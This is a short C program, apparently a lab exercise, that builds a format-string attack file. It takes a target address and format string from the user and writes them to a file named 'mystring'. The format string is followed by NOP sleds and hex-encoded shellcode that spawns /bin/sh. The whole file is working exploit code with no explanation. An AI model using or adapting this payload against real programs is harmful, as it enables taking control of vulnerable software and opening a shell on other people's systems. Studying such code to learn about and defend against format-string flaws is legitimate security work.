/* attack_fmt.c */
/* read from keyboard and write attack string to file */
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

char shellcode[] = 
"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
"\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";

void read2file()
{
    char buf[1024];
    int fp,size;
    unsigned int u_addr, *address;
 
    // getting the address of the variable. 
    puts("Please enter an address.");
    scanf("%u", &u_addr);
    address = (unsigned int *)buf;
    *address = u_addr+2;
    *(address+1) = u_addr;
    *(address+2) = u_addr;
    
    /* Getting the rest of the format string */
    puts("Please enter the format string:");
    scanf("%s",buf+12);
    size=strlen(buf+12)+4;
    printf("The string length is %d\n",size);

    /* Writing buf to "mystring" */
    fp=open("mystring",O_RDWR|O_CREAT|O_TRUNC, S_IRUSR|S_IWUSR);
    if(fp != -1){   
        write(fp,buf,size);
        /* fill with 128 NOP */ 
        memset(buf, 0x90, 128);
        write(fp,buf,128);
        /* write shellcode  */
        write(fp,shellcode,strlen(shellcode));
        /* fill with 128 NOP */ 
        write(fp,buf,128);
        close(fp);  
    }
    else {  printf("Open failed!\n");   }
}
void main(int argc, char * argv[])
{   read2file();    }

